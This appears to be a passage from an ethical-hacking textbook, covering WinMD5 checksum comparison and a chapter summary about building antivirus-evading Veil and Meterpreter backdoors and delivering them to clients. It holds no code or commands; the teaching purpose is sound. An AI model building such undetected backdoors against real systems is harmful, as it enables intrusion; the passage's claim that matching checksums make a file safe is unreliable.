<p>Another tool that is useful is WinMD5. This program will alert you when a file's signature or checksum has been modified in any way, which indicates that a file may have been tampered with, or is not the original file. To check, download and run WinMD5, where you can compare signatures and checksums for a file. If the values are the same, the file is safe, as shown in the following screenshot:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-2438 image-border" src="assets/c6b31a9e-d2dc-4f98-aa59-34dca05b246c.png" style="width:51.33em;height:37.17em;"/></p>
<div class="CDPAlignCenter CDPAlign"><br/>
MD5 checksum value generated</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Summary</h1>
                </header>
            
            <article>
                
<p>This chapter focused on client-side attacks. First, we installed a tool called Veil, which we use to exploit backdoors, through which we can gain access to a user's system. We then looked at payloads, before generating our own and testing it against antivirus programs. We also learned how t<span>o create a backdoor Meterpreter that was used to control a target computer without being detected by antivirus software. We concluded by looking at delivery methods, as well as how to protect systems from such attacks.The next chapter we are going to focus on using the social engineering to launch attacks on the client</span></p>


            </article>

            
        </section>
    </body></html>